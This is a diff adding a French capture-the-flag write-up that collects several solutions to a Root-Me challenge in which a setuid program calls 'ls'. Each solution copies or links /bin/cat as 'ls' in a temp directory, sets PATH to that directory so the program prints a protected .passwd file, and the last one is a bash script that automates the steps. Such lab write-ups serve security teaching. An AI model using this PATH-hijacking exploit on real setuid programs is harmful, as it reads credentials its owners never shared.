@@ -1,0 +1,108 @@
+Attaque par liens symboliques :
+
+binary1@wargame01:~$ ln -s /bin/cat /tmp/ls
+binary1@wargame01:~$ ls -l /tmp/ls
+lrwxrwxrwx 1 binary1 binary1 8 sep  1 02:53 /tmp/ls -> /bin/cat
+
+On écrase la variable d’environnement $PATH pour lui faire croire que le binaire ls est dans /tmp
+
+binary1@wargame01:~$ PATH=/tmp
+binary1@wargame01:~$ echo $PATH
+/tmp
+binary1@wargame01:~$ ./binary1 
+!o[...]d5
+
+FLAG : !o[...]d5
+
+ou
+
+En listant le répertoire on remarque qu’on possède l’attribute `s` sur l’exécutable `ch11`.
+Ce qui veut dire qu’on le lance avec les droits de l’owner, qui est `app-script-ch11-cracked`, soit le même owner que le fichier `.passwd`.
+
+app-script-ch11@challenge02:~$ ls -la
+total 24
+dr-xr-x---  2 app-script-ch11-cracked app-script-ch11         4096 Aug 11  2015 .
+drwxr-xr-x 14 root                    root                    4096 Nov 17 21:47 ..
+-r--r-----  1 app-script-ch11-cracked app-script-ch11-cracked   14 Feb  8  2012 .passwd
+-r-sr-x---  1 app-script-ch11-cracked app-script-ch11         7160 Aug 11  2015 ch11
+-r--r-----  1 app-script-ch11         app-script-ch11          153 Aug 11  2015 ch11.c
+
+Afin d’exécuter `cat` à la place de `ls` il suffit de copier l’exécutable dans `/tmp`
+
+app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls
+
+puis de changer la valeur de la variable d’environnement `PATH`
+
+app-script-ch11@challenge02:~$ PATH=/tmp
+app-script-ch11@challenge02:~$ echo $PATH
+/tmp
+
+Donc lorsque on exécutera une nouvelle fois le fichier `ch11` il lancera le programme `/tmp/ls` qui est une copie de `/bin/cat` et affichera donc le mot de passe !
+
+app-script-ch11@challenge02:~$ ./ch11
+!oPe[... flag snipped ...]5
+
+ou
+
+On copie cat en tant que ls dans /tmp
+
+    $ cp /bin/cat /tmp/ls
+
+On execute ./ch11 avec /tmp comme PATH
+
+    $ PATH="tmp" ./ch11
+    <flag>
+
+ou
+
+- Créer un fichier nommé "ls" : dans /var/tmp
+
+Et y insérer ce qui suit :
+
+    #!/bin/cat
+
+- Mettez les droits qu’il faut :
+
+    chmod 755 /var/tmp/ls
+
+- Modifiez la variable d’environnement PATH :
+PATH=/var/tmp
+
+- Exécutez le binary1 :
+
+    binary1@challenge02:~$ ./binary1
+    #!/bin/cat
+    xxxxxx
+
+ou
+
+    #!/bin/bash
+    #---
+    # Root-Me Challenge :
+    # https://www.root-me.org/fr/Challenges/App-Script/Bash-System-1
+    # References :
+    # http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf
+    # http://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf
+    #---
+    # Find a temporary folder in which you can write
+    tmpRoot=$(find / -writable -type d -name "tmp" 2>/dev/null | head -n 1)
+     
+    # Create temporary folder name
+    tmpFolder=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13 ; echo '')
+     
+    # Create new empty temporary folder
+    mkdir "${tmpRoot}/${tmpFolder}"
+     
+    # Copy cat program inside temporary folder named as "ls"
+    cp /bin/cat "${tmpRoot}/${tmpFolder}/ls"
+     
+    # Backup current PATH and replace PATH with the temporary folder
+    echo $PATH > "${tmpRoot}/${tmpFolder}/path"
+    PATH="${tmpRoot}/${tmpFolder}"
+     
+    # Execute program which will do an "ls" on the ".passwd" file (but instead will execute "cat" on it)
+    ./ch11
+     
+    # Restore old PATH and delete temporary folder
+    PATH=$(/bin/cat "${tmpRoot}/${tmpFolder}/path")
+    rm -r "${tmpRoot}/${tmpFolder}"
